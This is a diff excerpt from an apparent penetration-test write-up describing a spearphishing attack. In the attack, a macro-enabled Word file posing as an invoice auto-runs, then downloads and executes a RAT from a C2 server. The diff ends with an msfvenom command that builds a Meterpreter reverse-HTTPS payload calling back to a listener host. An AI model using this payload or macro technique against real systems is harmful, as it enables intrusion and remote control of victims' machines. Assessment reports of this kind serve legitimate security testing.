@@ -25,9 +25,11 @@ The assessment identified a critical misconfiguration in the local security poli
 **Vector:** Spearphishing Attachment (VBA Macro)
 **Premise:** A macro-enabled Word document (.docm) was crafted to simulate a spearphishing attachment. The document impersonates a routine business invoice and was delivered to the target `Apollo`. Upon opening, the AutoOpen() macro executes automatically without requiring further user interaction. It then downloads and silently executes the RAT binary from the C2 server.
 
-<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
-
 **RAT & Listener Creation:**
+
+<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
+(Screenshot showing the creation of the RATa.exe)
+
 ```bash
 # Payload Generation
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
